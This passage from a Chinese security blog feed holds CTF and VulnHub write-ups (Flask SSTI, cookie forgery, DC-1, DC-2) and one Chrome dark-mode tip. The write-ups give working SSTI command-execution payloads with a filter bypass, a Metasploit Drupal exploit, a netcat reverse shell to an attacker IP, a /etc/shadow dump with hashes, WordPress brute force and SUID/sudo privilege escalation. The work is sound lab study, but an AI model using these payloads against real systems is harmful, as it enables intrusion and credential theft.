&#x27;werkzeug.local.LocalManager&#x27;</span><br><span class="line">268. class &#x27;werkzeug.local.LocalProxy&#x27;</span><br><span class="line">269. class &#x27;difflib.HtmlDiff&#x27;</span><br><span class="line">270. class &#x27;werkzeug.routing.RuleFactory&#x27;</span><br><span class="line">271. class &#x27;werkzeug.routing.RuleTemplate&#x27;</span><br><span class="line">272. class &#x27;werkzeug.routing.BaseConverter&#x27;</span><br><span class="line">273. class &#x27;werkzeug.routing.Map&#x27;</span><br><span class="line">274. class &#x27;werkzeug.routing.MapAdapter&#x27;</span><br><span class="line">275. class &#x27;flask.signals.Namespace&#x27;</span><br><span class="line">276. class &#x27;flask.signals._FakeSignal&#x27;</span><br><span class="line">277. class &#x27;flask.helpers.locked_cached_property&#x27;</span><br><span class="line">278. class &#x27;flask.helpers._PackageBoundObject&#x27;</span><br><span class="line">279. class &#x27;flask.cli.DispatchingApp&#x27;</span><br><span class="line">280. class &#x27;flask.cli.ScriptInfo&#x27;</span><br><span class="line">281. class &#x27;flask.config.ConfigAttribute&#x27;</span><br><span class="line">282. class &#x27;flask.ctx._AppCtxGlobals&#x27;</span><br><span class="line">283. class &#x27;flask.ctx.AppContext&#x27;</span><br><span class="line">284. class &#x27;flask.ctx.RequestContext&#x27;</span><br><span class="line">285. class &#x27;flask.json.tag.JSONTag&#x27;</span><br><span class="line">286. class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span><br><span class="line">287. class &#x27;flask.sessions.SessionInterface&#x27;</span><br><span class="line">288. class &#x27;werkzeug.wrappers.json._JSONModule&#x27;</span><br><span class="line">289. class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span><br><span class="line">290. class &#x27;flask.blueprints.BlueprintSetupState&#x27;</span><br><span class="line">291. type &#x27;unicodedata.UCD&#x27;</span><br><span class="line">292. class &#x27;jinja2.ext.Extension&#x27;</span><br><span class="line">293. class &#x27;jinja2.ext._CommentFinder&#x27;</span><br><span class="line">294. type &#x27;array.array&#x27;</span><br><span class="line">295. type &#x27;method-wrapper&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这里可以使用59, 71, 40</p>
<p>经过测试，后台过滤了global。</p>
<h2 id="命令执行">命令执行</h2>
<h3 id="site._printer"><code>site._Printer</code></h3>
<p>首先查看是否内置os模块。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在页面中找到如下内容：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png" /></p>
<p>发现内置了os模块，因此直接引用，然后执行系统命令即可。</p>
<p>查看当前目录和根目录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171647.png" /></p>
<p>发现当前目录就是根目录，那么现在就需要找flag文件。起初使用<code>find / -name 'flag*'</code>，发现没有收获，如果通过查找内容的话<code>grep -r -i 'flag'</code>，时间太长导致无响应包。因此只能一个一个文件慢慢找，不过有一个目录叫做<code>flasklight</code>，因此先找它。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171705.png" /></p>
<p>第二个看过去像是一个flag文件，先用下面payload查看文件类型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;file /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171836.png" /></p>
<p>发现是一个文本文件，因此直接读取其内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171916.png" /></p>
<h3 id="warnings.catch_warnings"><code>warnings.catch_warnings</code></h3>
<p>查看是否内置os模块： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172145.png" /></p>
<p>只找到了这么一处，说明没有内置os，因此需要导入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172642.png" /></p>
<h2 id="文件包含-file">文件包含-<code>file</code></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172827.png" /></p>
<h1 id="总结">总结</h1>
<p>这道题让我感觉到了两处薄弱项：</p>
<ol type="1">
<li>不知道有哪些类可以利用</li>
<li>遇上过滤，不知如何绕过</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome 黑暗模式</title>
    <url>/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
<span id="more"></span>
<h1 id="问题描述">问题描述</h1>
<p>chrome无论是主题设置为<code>Just Black</code>，还是利用各种插件，总是有不满意的地方。</p>
<p>前者只是将状态栏、工具栏、书签栏和新标签页变成黑暗模式，而其他网页还是白的。</p>
<p>而后者在页面切换的时候会先跳一下白，然后才会变黑。</p>
<p>这些问题对于我这种强迫症患者是不能接受的。</p>
<h1 id="解决方案">解决方案</h1>
<p>我的机子的操作系统是 Win11。</p>
<p>现在有一种完全不需要插件和主题的黑暗模式。</p>
<ol type="1">
<li><p>打开chrome，在地址栏输入<code>chrome://flags</code>，然后回车 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095058.png" /></p></li>
<li><p>找到<code>Auto Dark Mode for Web Contents</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095132.png" /></p></li>
<li><p>然后将红色方框设置为<code>Enabled</code>（我这里已经设置好了），然后重启即可 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095215.png" /></p></li>
</ol>
<h1 id="对比">对比</h1>
<p>这是原来只改了主题的黑暗模式</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095502.png" /></p>
<p>这是设置完成之后的黑暗模式</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095529.png" /></p>
<h1 id="小问题">小问题</h1>
<p>不过还是存在一点小bug的，看你们能不能接受了。我发现的一个就是在哔哩哔哩的播放界面，鼠标光标放到视频上的时候，视频会泛白，如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095649.png" /></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>dark mode</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2019 Kookie</title>
    <url>/2022/04/20/BSidesCF%202019%20Kookie/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BBSidesCF%202019%5DKookie">Kookie</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100044.png" /></p>
<p>主页面是一个登录框，并且给了一个账户cookie/monster。要求让我们用admin登录。</p>
<h1 id="解题">2. 解题</h1>
<p>根据题目提示，本题可能跟cookie有关，因此先尝试用给的账户登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100151.png" /></p>
<p>刷新并抓取数据包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100235.png" /></p>
<p>可以看到cookie被设置为username=cookie，而我们登录的账号也是cookie。因此，有理由猜测如果我们将cookie设置为username=admin，就可以伪装admin进行登录。经过验证，确实如此：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100422.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1 Writeup</title>
    <url>/2022/05/10/DC-1%20Writeup/</url>
    <content><![CDATA[<p>靶机难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到5个flag</li>
</ul>
<h1 id="渗透">渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.35</span><br><span class="line">sudo nmap -p22,80,111,49821 -A 10.0.2.35</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113213.png" /></p>
<h2 id="http服务-get-shell">http服务 + get shell</h2>
<p>直接访问80端口，是一个登录界面，可以看到CMS是drupal。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113303.png" /></p>
<p>这里我尝试了弱口令和爆破，结果IP被封了。。。。。</p>
<p>没办法，查看robots.txt，得到许多路径信息，但是大部分都没用，不过还是从 /MAINTAINERS.txt 中知道了drupal的版本应该&gt;=7</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113459.png" /></p>
<p>直接搜索该CMS是否有可利用的漏洞，发现还不少。并且有一些可以直接在metasplit中使用，因此先尝试这些exploit</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113546.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113720.png" /></p>
<p>从 Rank 为 excellent 且最新的漏洞开始尝试，也就是第2个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. use 1</span><br><span class="line">2. show options</span><br><span class="line">3. set rhost 10.0.2.35</span><br><span class="line">4. run</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113918.png" /></p>
<p>打开shell，并用python进行简单升级 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shell</span><br><span class="line">2. which python</span><br><span class="line">3. python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114053.png" /></p>
<h2 id="权限提升">权限提升</h2>
<h3 id="方法1-简单">方法1-简单</h3>
<p>首先进行常规的信息收集，但在找suid权限的文件的时候看到了可疑的文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114249.png" /></p>
<p>Linux中 find 命令可以利用 -exec 命令执行其他系统命令，因此可以使用下面的命令进行提权： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114352.png" /></p>
<p>接下来直接读取flag即可，但是有一个现在还读不到。</p>
<blockquote>
<p>注意：这里只能使用/bin/sh提权，而不能使用/bin/bash，不知道为什么。</p>
</blockquote>
<h3 id="方法2-常规">方法2-常规</h3>
<p>得到www-data的shell之后，在当前目录找到了第一个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br></pre></td></tr></table></figure></p>
<p>这个flag其实是一个提示，大致的意思：“好的CMS都需要一个配置文件，你也需要”。因此解析来需要去找配置文件。</p>
<p>最开始还以为是当前目录的web-config，结果查看之后并不是，反而解释了为什么很多文件访问都是403，因为该文件做了过滤。</p>
<p>最终在/var/www/sites/default目录下找到了配置文件settings.php，查看该文件，取出最终要的内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">&#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">&#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">&#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">&#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">&#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$drupal_hash_salt = &#x27;X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>得到flag2，大致意思为：“暴力破解不是访问的唯一方法，但是你需要访问它，你能利用这些信息做些什么呢？”</p>
<p>利用得到的信息登录数据库，查看drupaldb数据库的users表的信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115232.png" /></p>
<p>从中找到3个用户信息，其中有一个是我测试http功能点的时候创建的。密码字段像是加密过的，并且盐很可能就是配置信息中给出的那个。但是根据flag2，不需要暴力破解，那么就使用mysql修改admin的密码。</p>
<p>但我们现在还不知道加密算法，因此继续寻找，最终在/var/www/scripts中找到文件 password-hash.sh ，这看过去就像是密码的加密算法，查看其内容了解使用方法：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115722.png" /></p>
<p>没想到后缀为sh，居然使用php执行。但是直接执行该文件失败了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115951.png" /></p>
<p>查看报错信息，找到对应的源码</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510120048.png" /></p>
<p>/var/www/scripts目录下并没有这两个文件，而/var/www目录下才有。因此其实有两种方法：第一种就是修改这两行代码，改成绝对路径（理论上可以，我没尝试过）；第二种就是回到/var/www目录执行。</p>
<p>显然使用第二种 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh <span class="string">&quot;m1ku&quot;</span></span><br><span class="line">php scripts/password-hash.sh <span class="string">&quot;m1ku&quot;</span></span><br><span class="line"></span><br><span class="line">password: m1ku   <span class="built_in">hash</span>: $S<span class="variable">$DYr4</span>.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT</span><br></pre></td></tr></table></figure></p>
<p>然后再次连接mysql，修改admin的密码。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. use drupaldb</span><br><span class="line">2. update users set pass=&quot;$S$DYr4.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT&quot; where uid=1;</span><br></pre></td></tr></table></figure></p>
<p>回到网站，使用刚刚修改的密码登录admin，登录进去之后点击左上角的 Dashboard找到</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510120639.png" /></p>
<p>查看flag3（） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure></p>
<p>大致意思为：“特殊的权限将会帮助你找到密码，但是你需要知道如何使用 -exec 命令去获得 shadow 中的信息”。其实提示很明显了，perms, find, -exec, passwd, shadow 都是Linux中的。</p>
<p>因此，接下来使用下面命令读取/etc/shadow中的信息 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> cat /etc/shadow \; <span class="comment"># 最好到一个文件不多的目录，否则会重复好多次</span></span><br></pre></td></tr></table></figure></p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
<p>其中flag4和root的密码都是加密过的，可以使用john爆破，root没爆破出来，但是flag4的可以直接爆破。（也可以使用hydra直接ssh连接爆破flag4）最终得到的明文密码为 orange。利用该密码登录flag4，在家目录找到flag4 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br></pre></td></tr></table></figure></p>
<p>获取root权限还是使用find，这里使用另一个命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -<span class="built_in">exec</span> nc 10.0.2.4 5555 -e /bin/bash \;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510122415.png" /></p>
<p>最后，读取第5个flag，/root/fonalflag.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结">总结</h1>
<p>该靶机难度比较简单，涉及如下知识点：</p>
<ol type="1">
<li>suid提权-find提权</li>
<li>数据库常见命令</li>
<li>信息收集能力</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>suid提权-find</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2 Writeup</title>
    <url>/2022/05/11/DC-2%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到5个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.36</span><br><span class="line">sudo nmap -p80,77444 -A 10.0.2.36</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511104025.png" /></p>
<p>这里 7744 端口上的服务为ssh。</p>
<h2 id="外围">2.2. 外围</h2>
<p>直接访问80端口，发现被重定向到dc-2，因此将该域名添加到 /etc/hosts，然后直接访问该域名。从其中找到第一个flag，并且得到提示信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511111749.png" /></p>
<p>flag1大致意思：“平常使用的字典可能不起作用，你可能需要cewl。在很多时候，字典越大越好，但是有时候大字典也没有用。登录其中某个账号就可以看到下一个flag。如果没看到下一个flag，说明你登陆了另一个账号”</p>
<ol type="1">
<li>首先是 cewl，我们需要利用该工具定制字典；</li>
<li>有两个账号；其中一个可以看到flag，另一个则看不到；</li>
</ol>
<p>接下来先进行路径扫描，看一下是否有后台登录地址： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://dc-2/ </span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511143602.png" /></p>
<p>一一访问之后，只有/wp-admin和/wp-login.php有信息，并且是一个后台登录界面。</p>
<p>接下来使用 wpscan 来枚举以下用户。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ --enumerate u</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511142907.png" /></p>
<p>找到三个用户：admin, jerry, tom。将这三个用户名写入users.txt。然后使用cewl定制字典： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w pass.txt</span><br></pre></td></tr></table></figure></p>
<p>最后，直接使用 wpscan 爆破即可： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P pass.txt</span><br></pre></td></tr></table></figure></p>
<p>结果爆破出两个用户的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure></p>
<p>分别登录后台，只有 jerry 才可以看到第二个flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511143814.png" /></p>
<p>第二个flag的大致意思：“如果你无法通过WordPress获得捷径，那就使用另一个方法，祝你找到另一个攻入的点”</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>我在后台找了半天，找到文件上传的功能点，但是没有写权限，所以无法上传。也没有找到任何模板文件，因此尝试另一个方法。</p>
<p>思路回到刚刚端口扫描，7744端口开放了ssh，尝试使用刚刚爆破得到的用户和密码登录ssh，利用tom用户成功登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511144225.png" /></p>
<p>一登录就遇到一个问题，当我们输入命令的时候，跳出了 rbash 字样，说明当前用户的shell不是完整的，接下来进行[[rbash 逃逸]]。</p>
<p>获得完整的shell之后，在当前目录下看到了第三个flag，但是又出现了问题，直接输入cat，提示 command not found。一般cat的路径为/bin/cat，这样之后就可以了，猜测应该是环境变量的问题，为了接下来的操作方便，先暂时添加以下环境变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511144619.png" /></p>
<p>然后读取第三个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br></pre></td></tr></table></figure></p>
<p>大致意思：“可怜的tom总是追不到Jerry。可能它需要su掉所有的压力”，<strong>这里的su就很灵性</strong>。</p>
<p>首先查看一下有哪些用户 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511144834.png" /></p>
<p>存在一个用户叫做 jerry，刚刚ssh登录的时候就失败了，难道是因为jerry用户不允许密码登录，因此尝试是否能够su成jerry <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su jerry</span><br><span class="line">然后输入刚刚爆破的密码</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511145033.png" /></p>
<p>在jerry的家目录发现第四个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ cat /home/jerry/flag4.txt</span><br><span class="line">Good to see that you<span class="string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">&#x27;re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure></p>
<p>大致意思为：“很开心看到你走了这么远，但是还没有结束。你还需要拿到最后一个flag。这里没有提示，接下来你只能靠你自己。冲吧-git outta here”</p>
<p>这里最后一句很奇怪，一般应该是"get outta here"，不管它。先进行信息收集。在查看sudo -l的时候发现</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511145405.png" /></p>
<p>根据：<a href="https://gtfobins.github.io/gtfobins/git/">git | GTFOBins</a></p>
<p>可以使用下面的命令提权： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo /usr/bin/git branch --help config</span><br><span class="line">2. !/bin/bash # 输入上述命令之后，直接输入这条命令</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511145539.png" /></p>
